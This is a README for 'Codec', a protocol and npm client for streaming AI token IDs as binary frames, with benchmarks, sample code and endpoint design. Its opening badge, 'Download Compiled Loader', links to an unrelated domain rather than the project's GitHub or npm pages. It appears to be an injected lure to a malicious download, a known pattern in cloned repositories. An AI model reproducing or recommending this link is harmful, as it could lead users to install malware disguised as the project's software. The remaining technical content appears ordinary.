# Codec

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

**Token-native binary transport for AI APIs.**

AI models speak token IDs internally — 32-bit integers drawn from a fixed vocabulary. Current APIs convert those IDs to UTF-8, wrap them in JSON, and ship that over HTTPS. The wire carries 150–190 bytes per token (measured). The model emitted a 4-byte integer.

Codec fixes the layer boundary. Token IDs stay token IDs until a human actually needs to read them.

```
Current:  model → uint32 IDs → UTF-8 → JSON/SSE → wire → JSON → UTF-8 → uint32 IDs → model
Codec:    model → uint32 IDs → binary frames → wire → uint32 IDs → model
```

---

## What ships today

| Surface | Where | What it is |
|---|---|---|
| **Wire spec** | [`spec/PROTOCOL.md`](spec/PROTOCOL.md) | v0.2 — msgpack/protobuf frames, transport compression, both endpoint paths |
| **Map schema** | [`spec/tokenizer-map.schema.json`](spec/tokenizer-map.schema.json) | v2 schema (vocab + merges + encoder) for tokenizer dialect maps |
| **Browser/Node client** | [`@codecai/web`](https://www.npmjs.com/package/@codecai/web) | Isomorphic Detokenizer + pure-JS BPE encoder. ~16 kB. |
| **Map generator** | [`@codecai/maps-cli`](https://www.npmjs.com/package/@codecai/maps-cli) | The `tsc --declaration` for tokenizer dialects. CLI + library. |
| **Map registry** | [`codec-maps`](https://github.com/wdunn001/codec-maps) | 14 model families / 70+ aliases, served via jsDelivr |
| **vLLM server** | [PR #41765](https://github.com/vllm-project/vllm/pull/41765) | `stream_format` on `/v1/completions` + dedicated `/v1/completions/codec` |
| **SGLang server** | [PR #24483](https://github.com/sgl-project/sglang/pull/24483) | Same surface, mirrored into SGLang |

---

## Measured wire impact

These come from `packages/bench` — deterministic microbench plus a live Ollama measurement. No vendor numbers, no marketing math.

**Wire microbench (1024 tokens, 1 token per chunk — token-by-token streaming):**

| Encoder                                   | B/token | vs JSON-SSE |
|-------------------------------------------|--------:|------------:|
| JSON-SSE                                  |   154.0 |        1.0× |
| Codec msgpack (identity)                  |    16.0 |        9.6× |
| Codec protobuf (identity)                 |    10.9 |   **14.2×** |
| Codec msgpack + `Content-Encoding: zstd`  |     3.4 |   **45.0×** |
| Codec protobuf + `Content-Encoding: zstd` |     3.6 |       43.1× |
| (theoretical floor: raw uint32)           |     4.0 |       38.5× |

**Live Ollama qwen2.5 (320-token completion, real model output):**

| Encoder                    | Wire     | B/token | vs JSON-SSE |
|----------------------------|---------:|--------:|------------:|
| JSON-SSE measured          |  58.3 KB |   186.4 |        1.0× |
| Codec msgpack (projected)  |   4.7 KB |    15.1 |   **12.4×** |
| Codec protobuf (projected) |   3.4 KB |    11.0 |   **16.9×** |

**Agent-to-agent round-trip (1024 tokens, modeled tokenize/detokenize):**

| Path             | Wire   | Total time | vs text |
|------------------|-------:|-----------:|--------:|
| text (JSON-SSE)  | 115 KB |    10.7 ms |    1.0× |
| codec (msgpack)  |  16 KB |     6.6 ms |    1.6× |
| codec (protobuf) |  11 KB |     2.9 ms | **3.6×** |

Real BPE tokenizers are 5–50× slower than the modeled hashtable lookup, so the codec advantage on real workloads is wider. See [`packages/bench`](packages/bench) for the methodology and to reproduce.

---

## Quick start (browser/Node client)

```bash
npm install @codecai/web
```

```ts
import { loadMap, Detokenizer, decodeStream } from '@codecai/web';

const map = await loadMap({
  url:  'https://cdn.jsdelivr.net/gh/wdunn001/codec-maps/maps/qwen/qwen2.json',
  hash: 'sha256:c73972f7a580…',
});
const detok = new Detokenizer(map);

const resp = await fetch('http://localhost:8000/v1/completions', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    model: 'Qwen/Qwen2.5-7B-Instruct',
    prompt: 'Explain entropy.',
    stream_format: 'msgpack',
    max_tokens: 256,
  }),
});

for await (const frame of decodeStream(resp.body!, 'msgpack')) {
  output.append(detok.render(frame.ids, { partial: !frame.done }));
}
```

For agent-to-agent (zero text on the wire in either direction):

```ts
import { BPETokenizer } from '@codecai/web';

const tok = new BPETokenizer(map);
const promptIds = tok.encode(userInput);   // pure-JS BPE, exact

await fetch('http://localhost:8000/v1/completions', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    prompt: promptIds,                      // OpenAI accepts int[] here
    stream_format: 'msgpack',
    max_tokens: 128,
  }),
});
```

---

## Repository layout

```
spec/
  PROTOCOL.md                 wire format, endpoints, compression negotiation
  tokenizer-map.schema.json   JSON Schema for tokenizer maps
packages/
  web/        @codecai/web        isomorphic detokenizer + BPE tokenizer
  maps-cli/   @codecai/maps-cli   generate maps from HF tokenizer.json
  bench/      benchmark suite (wire / handoff / live / compression)
  core/       legacy frame codec (kept for compatibility; @codecai/web supersedes)
  client/     legacy TS client (kept for compatibility)
  demo/       illustrative agent-to-agent demo
article/
  text-is-the-wrong-wire-format.md   the case for Codec
```

Sister repos:

- **[`codec-maps`](https://github.com/wdunn001/codec-maps)** — community registry of dialect maps for 14 model families. Served via jsDelivr.
- **[vLLM PR #41765](https://github.com/vllm-project/vllm/pull/41765)** — server-side encoder, two endpoint paths (`/v1/completions` + `stream_format`, and `/v1/completions/codec` for binary request bodies on huge prompts).
- **[SGLang PR #24483](https://github.com/sgl-project/sglang/pull/24483)** — same surface in SGLang.

---

## Endpoint design (two paths, same wire)

The Codec server adds three things to an OpenAI-compatible API:

```
POST /v1/completions        + stream_format=msgpack|protobuf   ← Path A: binary out, JSON in
POST /v1/completions/codec                                      ← Path B: binary in + binary out
GET  /codec/schema                                              ← .proto schema
```

**Path A is required.** It works for any prompt size and is the default for browser clients. The request body is plain JSON — `prompt: int[]` already standard in OpenAI's spec.

**Path B is optional.** It accepts `application/x-msgpack` or `application/x-protobuf` request bodies, saving 2–3× bandwidth on huge prompts (>50K tokens) where the JSON `[int, int, ...]` array balloons. Same streaming output as Path A.

Both produce identical wire output. Pick whichever fits your client.

---

## Transport compression (negotiated)

Codec supports optional compression of the response stream via standard HTTP `Accept-Encoding` / `Content-Encoding`. Negotiation is opt-in (PKCE-style) — clients advertise what they support, servers respond with whatever overlap exists, identity is the universal fallback.

| Encoding   | Server | Client | Notes                                          |
|------------|--------|--------|------------------------------------------------|
| `identity` | MUST   | MUST   | The fallback. Always works.                    |
| `gzip`     | SHOULD | SHOULD | Stdlib in every language. Universal browser support. |
| `zstd`     | MAY    | MAY    | Best ratio. Browsers: Chrome 123+, Firefox 126+. |

Browsers handle decompression transparently in `fetch()`, so `@codecai/web` requires zero changes to consume compressed streams.

---

## Run the benchmarks

```bash
npm install
npm run bench:wire          # encoder microbench (~5s)
npm run bench:handoff       # agent round-trip (~5s)
npm run bench:compression   # gzip/zstd overlay (~5s)

# Live measurement against any OpenAI-compat server:
BENCH_URL=http://localhost:8000 BENCH_MODEL=qwen2.5:latest npm run bench:live
```

All bench output is deterministic given a fixed RNG seed. If a number in this README looks off, regenerate it from `packages/bench` and PR a fix — these are claims about software, not vibes.

---

## Status

What's validated end-to-end:

- ✅ **Wire format correctness.** Round-trip equivalence for msgpack and protobuf, tested at every chunk size.
- ✅ **9.6–17× reduction.** Measured uncompressed; ~45× with `Content-Encoding: zstd`.
- ✅ **3.6× handoff speedup.** End-to-end agent round-trip with eliminated detokenize/tokenize.
- ✅ **Pure-JS BPE.** Round-trips ASCII / code / emoji / CJK against the real Qwen-2 152K-vocab tokenizer (in `@codecai/web` test suite).
- ✅ **vLLM PR open** with binary streaming + bidirectional codec endpoint + zstd/gzip negotiation.
- ✅ **SGLang PR open** with the same surface.

What's still on the roadmap:

- **Pre-trained ZSTD dictionaries** declared alongside tokenizer maps. Estimated ~30% beyond zstd identity for typical streams.
- **Polyglot clients** — Python (PyPI), C library, .NET (NuGet), Java (Maven). The frame format is small (<300 LoC per language); the BPE encoder is bigger but tractable.
- **Map discovery** — formal registry vs `.well-known` URL convention. Not blocking; clients can pin URLs+hashes today.
- **Session protocol** — persistent connection variant for multiplexing. Stateless HTTP covers the common case.

---

## License

MIT. See [LICENSE](LICENSE).
